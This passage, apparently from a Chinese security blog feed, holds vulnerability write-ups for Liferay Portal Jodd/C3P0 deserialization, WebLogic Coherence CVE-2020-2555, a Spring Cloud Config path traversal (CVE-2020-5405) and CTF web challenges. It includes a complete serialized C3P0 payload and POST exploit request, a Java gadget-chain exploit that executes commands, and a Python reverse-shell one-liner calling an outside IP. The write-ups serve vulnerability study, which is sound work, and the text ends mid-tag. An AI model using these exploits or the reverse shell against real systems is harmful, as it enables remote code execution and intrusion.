alt="image-20200401231250716"></p><ol start="4"><li><p>执行bind方法. 这里input值就是最后返回的jsonObject，该对象中以key-value方式缓存字符. </p><p>直接跟进<code>ObjectBinder.findCLassInMap</code>方法.取出key为”class”赋值给classname。接着执行loadClass加载类.</p><p>,<code>instantiate</code>方法反射调用<code>newInstance</code>方法实例化.</p></li></ol><p><img src="./image-20200401232056524.png" srcset="/img/loading.gif" alt="image-20200401232056524"></p><ol start="5"><li>只用就会反射调用字段的setter方法.C3P0构造链中会执行危险函数readObject反序列化.执行的结果加载URLClassLoader加载远程恶意类.调用forName后执行构造类触发命令执行.</li></ol><p><img src="./image-20200401234038347.png" srcset="/img/loading.gif" alt="image-20200401234038347"></p><h1 id="JODD-反序列化"><a href="#JODD-反序列化" class="headerlink" title="JODD 反序列化"></a>JODD 反序列化</h1><p>liferay port在7.x版本采用Jodd对json进行操作。</p><p>本地环境搭建</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jodd<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jodd-json<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.6.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.C3P0Defaults;<span class="hljs-keyword">import</span> jodd.json.JsonParser;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">joddtest</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        String json = <span class="hljs-string">"&#123;\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383839312f740003466f6f;\"&#125;"</span>;        JsonParser jsonParser = <span class="hljs-keyword">new</span> JsonParser();        <span class="hljs-comment">//WrapperConnectionPoolDataSource Wra = new WrapperConnectionPoolDataSource();</span>        jsonParser.map((String)<span class="hljs-keyword">null</span>,WrapperConnectionPoolDataSource<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">parse</span>(<span class="hljs-title">json</span>)</span>;    &#125;&#125;</code></pre><p><img src="./image-20200403202624501.png" srcset="/img/loading.gif" alt="image-20200403202624501"></p><p>进入到parse方法中.Json字符串可控，rootType只要控制为恶意类，就能够成功反序列化C3P0.</p><p><img src="./image-20200403201547827.png" srcset="/img/loading.gif" alt="image-20200403201547827"></p><h1 id="liferay-portal"><a href="#liferay-portal" class="headerlink" title="liferay portal"></a>liferay portal</h1><p>只要找到类似上面Jodd反序列化操作，且关键的Json参数和rootType可控就能成功反序列化.</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>JODD反序列化操作中rootType和Json字符串可控导致RCE</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境下载地址:<a href="https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1" target="_blank" rel="noopener">https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1</a></p><p><em>可以连src一起下载方便搜索</em></p><p>生成POC</p><pre><code class="hljs bash">java -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://127.0.0.1:8891/ Exploit</code></pre><p>起服务</p><pre><code class="hljs bash">python3 -m http.server 8891</code></pre><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/jsonws/invoke</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost:8080<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 1304cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;tableId=1&amp;name=2&amp;type=3&amp;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=&#123;"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383839312f740003466f6f;"&#125;</code></pre><p><img src="./image-20200404025122223.png" srcset="/img/loading.gif" alt="image-20200404025122223"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点位于looseDeserialize方法执行中.全局搜索后，全局搜索到网上分析文章标注的触发点.</p><p><img src="./image-20200404014633458.png" srcset="/img/loading.gif" alt="image-20200404014633458"></p><p>跟进该方法JSONFactoryImpl.looseDeserialize()</p><p><img src="./image-20200404015205290.png" srcset="/img/loading.gif" alt="image-20200404015205290"></p><p>继续跟进use方法至map方法,在第78行会赋值target到rootTpe字段中.而json值就是恶意类需要执行setter方法的字段</p><p><img src="./image-20200404015356793.png" srcset="/img/loading.gif" alt="image-20200404015356793"></p><h1 id="defaultData值构造"><a href="#defaultData值构造" class="headerlink" title="defaultData值构造"></a>defaultData值构造</h1><p>回头看，是需要控制valueString和parameterType.网上有很多师傅已经完整分析出流程。这里简单分析啊defaultData为什么这样构造.</p><p>参数收集方法：<code>JSONWebServiceActionParameters#this._collectFromRequestParameters(httpServletRequest)</code>对收集参数进行整合存入内存中.</p><p>跟入到<code>this._jsonWebServiceActionParameters.put(parameterName, value);</code>.put方法以”:”为分割符,将”defaultData”作为key，<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>作为typeName存入到参数_parameterTypes中.</p><p><img src="./image-20200404022350826.png" srcset="/img/loading.gif" alt="image-20200404022350826"></p><p>之后需要调用<code>this._findJSONWebServiceAction(httpServletRequest, path, method, jsonWebServiceActionParameters);</code>验证传入的参数<code>_name</code>和<code>_type</code>是否与api中字段类型匹配。可以看到<code>_name=defaultData</code>存在属性<code>_type</code>为<code>java.lang.Object</code>可以利用该参数赋值任意类.</p><p><img src="./image-20200404023524123.png" srcset="/img/loading.gif" alt="image-20200404023524123"></p><p>满足上一步中匹配api中的参数之,<code>JSONWebServiceActionImpl#_prepareParameters()</code>方法中就能够加载C3P0存入parameterType中.</p><p><img src="./image-20200404024639050.png" srcset="/img/loading.gif" alt="image-20200404024639050"></p><p>只要满足以上条件最后就能够成功执行JSONWebServiceActionImpl#_convertValueToParameterValue()方法中进行反序列化.</p><pre><code class="hljs reasonml">parameterValue = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSONFactoryUtil</span>.</span></span>loose<span class="hljs-constructor">Deserialize(<span class="hljs-params">valueString</span>, <span class="hljs-params">parameterType</span>)</span>;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>在复现时候可以把漏洞点触发组件提取出来先打下poc调试。这样回溯参数会有目的性</li><li>该漏洞难点我觉得主要还是在defaultData值的分析，需要适配api中的字段也是一个坑点.</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/7499" target="_blank" rel="noopener">https://xz.aliyun.com/t/7499</a><br><a href="https://xz.aliyun.com/t/7485" target="_blank" rel="noopener">https://xz.aliyun.com/t/7485</a><br><a href="https://nosec.org/home/detail/4394.html" target="_blank" rel="noopener">https://nosec.org/home/detail/4394.html</a><br><a href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2020-2555] weblogic coherence基于t3协议反序列化复现分析</title>
    <link href="/2020/03/25/CVE-2020-2555-weblogic-coherence%E5%9F%BA%E4%BA%8Et3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/03/25/CVE-2020-2555-weblogic-coherence%E5%9F%BA%E4%BA%8Et3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><blockquote><p>weblogic: fmw_12.2.1.4.0_wls.jar</p><p>java版本: 1.8.0_202</p></blockquote><p>在进行域配置时候需要勾选下面两个(不勾选不知道就是实现不了，很迷)</p><p><img src="./image-20200324210110947.png" srcset="/img/loading.gif" alt="image-20200324210110947"></p><h2 id="Debug-配置"><a href="#Debug-配置" class="headerlink" title="Debug 配置"></a>Debug 配置</h2><p><img src="./image-20200325112147777.png" srcset="/img/loading.gif" alt="image-20200325112147777"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞触发点位于<strong>/Oracle_Home/coherence/lib/coherence.jar!/com/tangosol/util/filter/LimitFilter.class#toString()</strong></p><p>其中通过调用extract并触发toString类似commonscollections5的反序列化调用<code>BadAttributeValueExpException</code>的readObject方法.</p><p><img src="./image-20200325110959658.png" srcset="/img/loading.gif" alt="image-20200325110959658"></p><p>可以看到其中extractor由<code>m_comparator</code>为类变量和ValueExtractor接口类型可控.触犯<code>extract</code>方法中的<code>m_oAnchorTop</code>参数也是如此.</p><p><img src="./image-20200325104740508.png" srcset="/img/loading.gif" alt=""></p><p>所以接下来就是考虑<code>m_comparator</code>和<code>m_nAnchorTop</code>的构造</p><p><code>m_comparator</code>全局搜索实现extract方法的相关类</p><p><img src="./image-20200325105605693.png" srcset="/img/loading.gif" alt="image-20200325105605693"></p><p>定位到</p><p><strong>/Oracle_Home/coherence/lib/coherence.jar!/com/tangosol/util/extractor/ChainedExtractor.class#extract()</strong></p><p>其中对aExtractor参数进行遍历执行extract方法.类似于cc5中遍历+反射达到命令执行的目的.即可以将<code>m_comparator</code>赋值为精心构造<code>ChainedExtractor</code>.</p><p>所以<code>m_oAnchorTop</code> 将作为link start赋值为<code>Runtime.class</code></p><p><img src="./image-20200325110426737.png" srcset="/img/loading.gif" alt="image-20200325110426737"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.corba.se.impl.io.OutputStreamHook;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.utils.XMLSecurityManager;<span class="hljs-keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;<span class="hljs-keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;<span class="hljs-keyword">import</span> com.tangosol.util.filter.LimitFilter;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException </span>&#123;        ReflectionExtractor[] extractors = <span class="hljs-keyword">new</span> ReflectionExtractor[]&#123;                <span class="hljs-keyword">new</span> ReflectionExtractor(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),                <span class="hljs-keyword">new</span> ReflectionExtractor(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),                <span class="hljs-keyword">new</span> ReflectionExtractor(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"open /System/Applications/Calculator.app"</span>&#125;&#125;)        &#125;;        ChainedExtractor chainedExtractor = <span class="hljs-keyword">new</span> ChainedExtractor(extractors);        <span class="hljs-comment">// m_oAnchorTop插入初始对象</span>        LimitFilter limitFilter = <span class="hljs-keyword">new</span> LimitFilter();        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="hljs-string">"m_oAnchorTop"</span>);        m_oAnchorTop.setAccessible(<span class="hljs-keyword">true</span>);        m_oAnchorTop.set(limitFilter, Runtime<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;        <span class="hljs-comment">//m_comparator,插入执行extract</span>        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="hljs-string">"m_comparator"</span>);        m_comparator.setAccessible(<span class="hljs-keyword">true</span>);        m_comparator.set(limitFilter, chainedExtractor);        <span class="hljs-comment">//BadAttributeValueExpException readObject() -&gt; toString()</span>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);        Field val = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">"val"</span>);        val.setAccessible(<span class="hljs-keyword">true</span>);        val.set(badAttributeValueExpException, limitFilter);        <span class="hljs-comment">//序列化对象</span>        FileOutputStream in = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"exp.ser"</span>);        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(in);        out.writeObject(badAttributeValueExpException);    &#125;&#125;</code></pre><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="./image-20200325111334022.png" srcset="/img/loading.gif" alt="image-20200325111334022"></p><h1 id="额外新链"><a href="#额外新链" class="headerlink" title="额外新链"></a>额外新链</h1><h2 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h2><p>很迷的是，直接构造链条无法成功，这里留个坑</p><p><img src="./image-20200326163052599.png" srcset="/img/loading.gif" alt="image-20200326163052599"></p><h2 id="TemplatesImpl-javassit-适用于单次反射调用"><a href="#TemplatesImpl-javassit-适用于单次反射调用" class="headerlink" title="TemplatesImpl (javassit)适用于单次反射调用"></a>TemplatesImpl (javassit)适用于单次反射调用</h2><p>限制就是java高版本无法成功,高版本java中要开启Feature.SupportNonPublicField才能进行对非共有属性的反序列化处理</p><p>参考链接:<a href="https://xz.aliyun.com/t/7417" target="_blank" rel="noopener">https://xz.aliyun.com/t/7417</a></p><h1 id="补丁-修复"><a href="#补丁-修复" class="headerlink" title="补丁/修复"></a>补丁/修复</h1><p>看样子是直接解决掉toString方法下的extract方法调用。</p><p><img src="./image-20200325111657465.png" srcset="/img/loading.gif" alt="image-20200325111657465"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/Y4er/CVE-2020-2555" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2555</a></p><p>[<a href="https://hu3sky.github.io/2020/03/08/CVE-2020-2555%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">https://hu3sky.github.io/2020/03/08/CVE-2020-2555%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]</a>(<a href="https://hu3sky.github.io/2020/03/08/CVE-2020-2555" target="_blank" rel="noopener">https://hu3sky.github.io/2020/03/08/CVE-2020-2555</a> 漏洞分析/)</p><p><a href="https://nosec.org/home/detail/4314.html" target="_blank" rel="noopener">https://nosec.org/home/detail/4314.html</a></p><p><a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2020-5405] spring-cloud-config-server 路径穿越漏洞复现</title>
    <link href="/2020/03/16/CVE-2020-5405-spring-cloud-config-server-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/03/16/CVE-2020-5405-spring-cloud-config-server-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>源码：<a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a></p><p>Configserver.yml文件配置，配置为本地，此漏洞一大限制就是当配置为git时无法进行路径穿越</p><p><img src="./image-20200316105308980.png" srcset="/img/loading.gif" alt="image-20200316105308980"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据网上分析路由直接打桩</p><p>路由请求方式”<a href="http://url/{name}/{profile/{label/**}}&quot;" target="_blank" rel="noopener">http://url/{name}/{profile/{label/**}}&quot;</a></p><p><img src="./image-20200316103859841.png" srcset="/img/loading.gif" alt="image-20200316103859841"></p><p>跟进<code>retrieve</code>方法中，造成路径穿越的原因之一就是<code>resolveLabel</code>函数</p><p><img src="./image-20200316104524616.png" srcset="/img/loading.gif" alt="image-20200316104524616"></p><p>可以看到对路径符号<code>/</code>替换为<code>(_)</code></p><p>所以可以构造路径转好符号<code>..(_) =&gt; ../</code> </p><p><img src="./image-20200316104639790.png" srcset="/img/loading.gif" alt="image-20200316104639790"></p><p>可以构造路径穿越符号，现在关注点就是获取资源是否对路径或者资源进行限制.</p><p>确定资源需要跟进findOne方法. </p><p><img src="./image-20200316104931700.png" srcset="/img/loading.gif" alt="image-20200316104931700"></p><p>可以看到以下代码都是对locations变量进行操作，具体跟进下</p><p>跟进getLocations方法，</p><ol><li><p>获得本地search-Locations路径</p><p><img src="./image-20200316110814614.png" srcset="/img/loading.gif" alt="image-20200316110814614"></p></li><li><p>替换模版中变量为字符</p><p><img src="./image-20200316110824017.png" srcset="/img/loading.gif" alt="image-20200316110824017"></p></li><li><p>拼接lable</p><p><img src="./image-20200316110754084.png" srcset="/img/loading.gif" alt="image-20200316110754084"></p></li><li><p>最后得到Locations结果</p></li></ol><p><img src="./image-20200316105744221.png" srcset="/img/loading.gif" alt="image-20200316105744221"></p><p>循环遍历locations数组，最后返回file对象.其中造成漏洞的参数为</p><p><code>file:///Users/osword/Desktop/config-repo../../../../../../../../../../../../../../../../../etc/</code></p><p><img src="./image-20200316111111940.png" srcset="/img/loading.gif" alt="image-20200316111111940"></p><p>跟进getReource方法</p><p>getResource方法中会调用parseUrl方法解析该字符为请求的Url,在经过一次cleanPath方法清洁返回<code>file:/../../../../../../../../../../../../etc/</code>,最后以此最为URl对象参数并返回</p><p><img src="./image-20200316112728162.png" srcset="/img/loading.gif" alt="image-20200316112728162"></p><p>最后调用createRelative指定相对路径参数，这里就是需要读取的文件名.</p><p><img src="./image-20200316112857209.png" srcset="/img/loading.gif" alt="image-20200316112857209"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><img src="./image-20200316113734912.png" srcset="/img/loading.gif" alt="image-20200316113734912"></p><h1 id="漏洞限制"><a href="#漏洞限制" class="headerlink" title="漏洞限制"></a>漏洞限制</h1><ol><li>无法读取无后缀的文件</li><li>多传一级目录，parseUrl处理时会删除第一个<code>/../</code></li><li>配置为native</li></ol><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0</a></p><p>在获取返回URL对象时候就对路径穿越符号进行消毒.</p><p><img src="./image-20200316114406175.png" srcset="/img/loading.gif" alt="image-20200316114406175"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.lmxspace.com/2020/03/09/spring-cloud-config-server-路径穿越漏洞分析[CVE-2020-5405]/" target="_blank" rel="noopener">http://www.lmxspace.com/2020/03/09/spring-cloud-config-server-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%90CVE-2020-5405%E3%80%91/</a></p><p><a href="https://www.cnblogs.com/r00tuser/p/12458518.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/12458518.html</a></p><p><a href="https://blog.riskivy.com/cve-2020-5405-spring-cloud-config-server-%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a/" target="_blank" rel="noopener">https://blog.riskivy.com/cve-2020-5405-spring-cloud-config-server-%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CTF]V&amp;N内部考核WEB题解</title>
    <link href="/2020/03/03/CTF-V-N%E5%86%85%E9%83%A8%E8%80%83%E6%A0%B8WEB%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/03/03/CTF-V-N%E5%86%85%E9%83%A8%E8%80%83%E6%A0%B8WEB%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<span class="hljs-keyword">import</span> osapp = Flask(__name__)flag_file = open(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"r"</span>)<span class="hljs-comment"># flag = flag_file.read()</span><span class="hljs-comment"># flag_file.close()</span><span class="hljs-comment">#</span><span class="hljs-comment"># @app.route('/flag')</span><span class="hljs-comment"># def flag():</span><span class="hljs-comment">#     return flag</span><span class="hljs-comment">## want flag? naive!</span><span class="hljs-comment"># You will never find the thing you want:) I think</span><span class="hljs-meta">@app.route('/shell')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span>:</span>    os.system(<span class="hljs-string">"rm -f flag.txt"</span>)    exec_cmd = request.args.get(<span class="hljs-string">'c'</span>)    os.system(exec_cmd)    <span class="hljs-keyword">return</span> <span class="hljs-string">"1"</span><span class="hljs-meta">@app.route('/')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">source</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"app.py"</span>,<span class="hljs-string">"r"</span>).read()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    app.run(host=<span class="hljs-string">'0.0.0.0'</span>)</code></pre><p>命令执行操作，但是没有回显示，可以利用反弹shell。但是flag.txt文件已经被删除。</p><p>思路：在linux系统中只要文件被打开,/proc/self/fd/n就会有缓存</p><p>这里安利一篇文章：<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">通杀漏洞利用回显方法-linux平台</a></p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://be8c5a4b-9e00-4024-a486-4f0ff7e7571f.node3.buuoj.cn/shell?c=python3<span class="hljs-number">%20</span>-c<span class="hljs-number">%20</span><span class="hljs-number">%27</span>import<span class="hljs-number">%20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-number">%22174</span>.0.224.196<span class="hljs-number">%22</span>,8899));os.dup2(s.fileno(),0);<span class="hljs-number">%20</span>os.dup2(s.fileno(),1);<span class="hljs-number">%20</span>os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-number">%22</span>/bin/sh<span class="hljs-number">%22</span>,<span class="hljs-number">%22</span>-i<span class="hljs-number">%22</span>]);<span class="hljs-number">%27</span></code></pre><p><img src="./image-20200302213906715.png" srcset="/img/loading.gif" alt="image-20200302213906715"></p><h1 id="TimeTravle"><a href="#TimeTravle" class="headerlink" title="TimeTravle"></a>TimeTravle</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/vendor/autoload.php'</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>])) &#123;    $client = <span class="hljs-keyword">new</span> Client();    $response = $client-&gt;get(<span class="hljs-string">'http://127.0.0.1:5000/api/eligible'</span>);    $content = $response-&gt;getBody();    $data = json_decode($content, <span class="hljs-keyword">TRUE</span>);    <span class="hljs-keyword">if</span>($data[<span class="hljs-string">'success'</span>] === <span class="hljs-keyword">true</span>) &#123;      <span class="hljs-keyword">echo</span> system(<span class="hljs-string">'/readflag'</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'file'</span>])) &#123;    highlight_file($_GET[<span class="hljs-string">'file'</span>]);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'phpinfo'</span>])) &#123;    phpinfo();&#125;</code></pre><p>简单审计：有文件读取操作和phpinfo信息泄露操作，但是拿到flag需要访问api，</p><p>读取本地docker文件</p><p><code>/start.sh</code></p><p>nginx+php且phpinfo显示利用cgi通信</p><p><img src="./image-20200302215620065.png" srcset="/img/loading.gif" alt="image-20200302215620065"></p><p>读取/src/app.py,运行该api需要在2050年才能返回true.</p><p><img src="./image-20200302215757406.png" srcset="/img/loading.gif" 